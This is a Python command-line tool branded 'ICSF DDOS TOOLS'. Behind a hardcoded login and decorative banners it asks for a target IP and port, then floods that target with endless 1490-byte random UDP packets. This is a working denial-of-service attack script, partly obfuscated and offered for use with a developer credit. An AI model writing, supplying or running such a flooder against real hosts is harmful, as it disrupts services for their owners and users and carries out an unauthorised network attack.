import os
import time
import socket
import random

import os
import time

def slow_print(text, delay=0.002):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)

def print_logo():
    os.system("cls" if os.name == "nt" else "clear")
    print("\033[92m")  # Green text color

    ascii_art = r"""
█████   █████████   █████████  ███████████                     
░░███   ███░░░░░███ ███░░░░░███░░███░░░░░░█                     
 ░███  ███     ░░░ ░███    ░░░  ░███   █ ░                      
 ░███ ░███         ░░█████████  ░███████                        
 ░███ ░███          ░░░░░░░░███ ░███░░░█                        
 ░███ ░░███     ███ ███    ░███ ░███  ░                         
 █████ ░░█████████ ░░█████████  █████                           
░░░░░   ░░░░░░░░░   ░░░░░░░░░  ░░░░░                            

 ███████████    ███████       ███████    █████        █████████ 
░█░░░███░░░█  ███░░░░░███   ███░░░░░███ ░░███        ███░░░░░███
░   ░███  ░  ███     ░░███ ███     ░░███ ░███       ░███    ░░░ 
    ░███    ░███      ░███░███      ░███ ░███       ░░█████████ 
    ░███    ░███      ░███░███      ░███ ░███        ░░░░░░░░███
    ░███    ░░███     ███ ░░███     ███  ░███      █ ███    ░███
    █████    ░░░███████░   ░░░███████░   ███████████░░█████████ 
   ░░░░░       ░░░░░░░       ░░░░░░░    ░░░░░░░░░░░  ░░░░░░░░░
"""
    slow_print(ascii_art, delay=0.0005)

    print("\n\033[1;91m")  # Bold + Red text color start
    print("👨‍💻 Dev   : SOMSER")
    print("👑 Team  : Admin")
    print("✅ Admin Contact   : ➤ https://facebook.com/contact.hare")
    print("\033[0m\n")  # Reset to default color and style

# print_logo()  # Uncomment to run
    

#line:34:print("\n")
def login ():#line:37:def login():
    print ("\033[92m")#line:38:print("\033[92m")
    print ("   ╔════════════════════════════╗")#line:39:print("   ╔════════════════════════════╗")
    print ("   ║      LOGIN TO CONTINUE     ║")#line:40:print("   ║      LOGIN TO CONTINUE     ║")
    print ("   ╚════════════════════════════╝")#line:41:print("   ╚════════════════════════════╝")
    O0O0OO0000OO00O00 =0 #line:43:attempts = 0
    while O0O0OO0000OO00O00 <3 :#line:44:while attempts < 3:
        O0000000OOO000O00 =input ("\n   ➤ Enter Username: ")#line:45:username = input("\n   ➤ Enter Username: ")
        OO00OO00OO0OOO00O =input ("   ➤ Enter Password: ")#line:46:password = input("   ➤ Enter Password: ")
        if O0000000OOO000O00 =="icsf-tools"and OO00OO00OO0OOO00O =="icsf-d":#line:48:if username == "icsf-tools" and password == "icsf-d":
            print ("\n   ✅ Login Successful!\n")#line:49:print("\n   ✅ Login Successful!\n")
            time .sleep (1 )#line:50:time.sleep(1)
            os .system ("clear")#line:51:os.system("clear")
            return True #line:52:return True
        else :#line:53:else:
            O0O0OO0000OO00O00 +=1 #line:54:attempts += 1
            print (f"\n   ❌ Invalid Credentials! Attempts Left: {3 - O0O0OO0000OO00O00}\n")#line:55:print(f"\n   ❌ Invalid Credentials! Attempts Left: {3 - attempts}\n")
    print ("\n   ❌ Access Denied! Exiting...\n")#line:57:print("\n   ❌ Access Denied! Exiting...\n")
    exit ()#line:58:exit()
def loading_bar ():#line:61:def loading_bar():
    print ("\033[91m")#line:62:print("\033[91m")
    for O00O00O0OOO00OOOO in range (101 ):#line:63:for i in range(101):
        time .sleep (0.01 )#line:64:time.sleep(0.01)  # Faster loading
        print (f"\r   ➤ Loading: [{'#' * (O00O00O0OOO00OOOO//5)}{' ' * (20 - (O00O00O0OOO00OOOO//5))}] {O00O00O0OOO00OOOO}%",end ='',flush =True )#line:65:print(f"\r   ➤ Loading: [{'#' * (i//5)}{' ' * (20 - (i//5))}] {i}%", end='', flush=True)
    print ("\n\n")#line:66:print("\n\n")
def get_target_details ():#line:69:def get_target_details():
    print ("\033[93m")#line:70:print("\033[93m")
    print ("   ╔══════════════════════════════════════════╗")#line:71:print("   ╔══════════════════════════════════════════╗")
    print ("   ║          ENTER TARGET DETAILS            ║")#line:72:print("   ║          ENTER TARGET DETAILS            ║")
    print ("   ╚══════════════════════════════════════════╝")#line:73:print("   ╚══════════════════════════════════════════╝")
    O0OOOOOO0OO0OOOOO =input ("\n   ➤ Enter Target Website URL: ")#line:75:url = input("\n   ➤ Enter Target Website URL: ")
    OO00OOOOO0O0O000O =input ("   ➤ Enter Target IP Address: ")#line:76:ip = input("   ➤ Enter Target IP Address: ")
    OO000OO00O0O00000 =int (input ("   ➤ Enter Target Port Number: "))#line:77:port = int(input("   ➤ Enter Target Port Number: "))
    print ("\n   ✅ Details received successfully.\n")#line:79:print("\n   ✅ Details received successfully.\n")
    return O0OOOOOO0OO0OOOOO ,OO00OOOOO0O0O000O ,OO000OO00O0O00000 #line:80:return url, ip, port
def print_ddos_banner():
    print("\033[96m")  # Cyan text color
    print("   ╔══════════════════════════════════════════╗")
    print("   ║             ICSF DDOS TOOLS              ║")
    print("   ╚══════════════════════════════════════════╝")
    print("\n")
    print("""
██╗ ██████╗███████╗███████╗      
██║██╔════╝██╔════╝██╔════╝      
██║██║     ███████╗█████╗        
██║██║     ╚════██║██╔══╝        
██║╚██████╗███████║██║           
╚═╝ ╚═════╝╚══════╝╚═╝           
                                 
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
    ___   __  __             __  
   /   | / /_/ /_____ ______/ /__
  / /| |/ __/ __/ __ `/ ___/ //_/
 / ___ / /_/ /_/ /_/ / /__/ ,<   
/_/  |_\__/\__/\__,_/\___/_/|_|  
                                  
""")
    print("\033[0m")  # Reset color
def start_ddos (O0O00OO00OOO0O0OO ,OOO00O0OO0O000O00 ):#line:97:def start_ddos(ip, port):
    O00O0000OOO000000 =socket .socket (socket .AF_INET ,socket .SOCK_DGRAM )#line:98:sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    O00OO0O0000OO00O0 =random ._urandom (1490 )#line:99:bytes = random._urandom(1490)
    OO00OOO0000O0OO00 =0 #line:100:packet_count = 0
    print (f"\n   🚀 DDoS Attack started on {O0O00OO00OOO0O0OO} through port {OOO00O0OO0O000O00}")#line:102:print(f"\n   🚀 DDoS Attack started on {ip} through port {port}")
    while True :#line:104:while True:
        O00O0000OOO000000 .sendto (O00OO0O0000OO00O0 ,(O0O00OO00OOO0O0OO ,OOO00O0OO0O000O00 ))#line:105:sock.sendto(bytes, (ip, port))
        OO00OOO0000O0OO00 +=1 #line:106:packet_count += 1
        print (f"\033[35m   ➤ Sent packet #{OO00OOO0000O0OO00} to {O0O00OO00OOO0O0OO} on port {OOO00O0OO0O000O00}")#line:107:print(f"\033[35m   ➤ Sent packet #{packet_count} to {ip} on port {port}")  # Added purple color
def main ():#line:110:def main():
    print_logo ()#line:111:print_logo()
    if login ():#line:114:if login():
        print_ddos_banner ()#line:116:print_ddos_banner()
        loading_bar ()#line:119:loading_bar()
        O0OO0OOO0000O0000 ,O0OO000000O0000O0 ,OO0O0O0OO0O0OO0OO =get_target_details ()#line:122:url, ip, port = get_target_details()
        start_ddos (O0OO000000O0000O0 ,OO0O0O0OO0O0OO0OO )#line:125:start_ddos(ip, port)
    else :#line:126:else:
        print ("\033[91m   ❌ Access Denied! Please try logging in again.")#line:127:print("\033[91m   ❌ Access Denied! Please try logging in again.")
if __name__ =="__main__":#line:129:if __name__ == "__main__":
    main ()#line:130:main()
